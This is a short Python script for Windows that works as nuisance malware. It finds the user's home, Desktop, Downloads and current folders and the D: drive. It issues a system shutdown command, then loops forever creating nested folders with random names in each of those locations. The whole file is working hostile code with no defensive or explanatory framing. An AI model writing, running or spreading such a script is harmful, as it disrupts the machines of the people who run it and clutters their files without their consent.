from os import *
from getpass import getuser
from random import sample
#find the Desktop
def Desktop():
    username = getuser()
    addres = "C:\\Users\\" + username + "\\Desktop" 
    return addres
#find Downloads directory
def Download():
    username = getuser()
    addres = "C:\\Users\\" + username + "\\Downloads"
    return addres
addres_1 = getcwd()
addres_2 = "C:\\Users\\" + getuser()
addres_3 = Desktop()
addres_4 = "D:\\"
addres_5 = Download()
name = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789(_!@#$%^&=+-`~)"
#turn of the system ofter 10 sec
system("shutdown/s")
while True:
    #make random name for directory
    directory = "".join(sample(name,10))
    #create the directoryes
    chdir(addres_1)
    system("mkdir {}\{}\{}\{}".format(directory,directory,directory,directory))
    chdir(addres_2)
    system("mkdir {}\{}\{}\{}".format(directory,directory,directory,directory))
    chdir(addres_3)
    system("mkdir {}\{}\{}\{}".format(directory,directory,directory,directory))
    chdir(addres_4)
    system("mkdir {}\{}\{}\{}".format(directory,directory,directory,directory))
    chdir(addres_5)
    system("mkdir {}\{}\{}\{}".format(directory,directory,directory,directory))